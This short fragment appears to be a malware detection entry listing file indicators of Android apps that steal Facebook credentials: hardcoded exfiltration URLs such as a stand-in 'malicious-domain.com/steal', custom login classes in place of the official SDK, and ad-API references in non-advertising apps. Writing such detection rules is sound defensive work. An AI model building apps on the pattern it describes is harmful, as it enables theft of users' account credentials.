Access to Facebook ad management APIs by non-advertising or photo editing apps
file_indicators: App code containing hardcoded external URLs or domains for credential exfiltration (e.g., 'https://malicious-domain.com/steal')
Presence of custom Facebook login Activity or class (e.g., CustomFacebookLogin.java) instead of using official Facebook SDK components
References to Facebook ad management API endpoints or classes (e.g., AdManager) in apps not intended for advertising
